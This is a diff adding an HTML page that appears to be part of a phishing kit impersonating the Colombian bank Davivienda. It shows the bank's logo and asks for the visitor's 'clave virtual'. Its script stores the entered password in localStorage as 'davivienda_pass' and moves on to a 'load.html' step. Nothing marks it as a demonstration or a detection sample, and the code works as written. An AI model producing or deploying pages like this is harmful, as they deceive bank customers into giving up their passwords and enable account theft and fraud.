@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+   
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="./imagenes/unnamed.png?v=2">
+    <title>Davivienda - Contraseña</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Open Sans', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-white flex flex-col min-h-screen">
+    <div class="w-full max-w-md mx-auto px-6 pt-8 pb-4">
+        <!-- Logo -->
+        <div class="flex justify-center mb-12">
+            <img src="./imagenes/Davivienda-Logo-EPS-vector-image.png" alt="Davivienda" class="w-[240px] object-contain">
+        </div>
+
+        <!-- Greeting -->
+        <div class="mb-8">
+            <h1 class="text-[28px] font-normal text-[#333] leading-tight">Casi listo</h1>
+            <h2 class="text-[24px] font-bold text-[#333] leading-tight">Ingrese su clave virtual</h2>
+        </div>
+
+        <!-- Form -->
+        <form id="passwordForm" onsubmit="return sender()" class="space-y-6">
+            <div class="space-y-2">
+                <label class="block text-[15px] text-[#666]">Contraseña Virtual</label>
+                <input type="password" id="clave" class="w-full h-[50px] border border-[#ccc] rounded-[10px] px-4 text-[#333] text-[16px] focus:outline-none focus:border-[#ED1C24]" required>
+            </div>
+
+            <div class="pt-6">
+                <button type="submit" class="w-full h-[54px] bg-[#ED1C24] text-white font-bold text-[18px] rounded-full hover:bg-[#d11a20] transition-colors">
+                    Ingresar
+                </button>
+            </div>
+        </form>
+
+        <div class="mt-6 text-center">
+            <a href="identificacion.html" class="text-[#ED1C24] text-[15px] font-semibold">Volver</a>
+        </div>
+
+        <!-- Divider -->
+        <div class="mt-20 pt-8 border-t border-[#eee]"></div>
+    </div>
+
+    <script>
+        function sender() {
+            const pass = document.getElementById("clave").value;
+
+            if (!pass) return false;
+
+            // Save to localStorage
+            localStorage.setItem('davivienda_pass', pass);
+
+            // Redirect to load page
+            window.location.href = 'load.html';
+            return false;
+        }
+    </script>
+</body>
+</html>
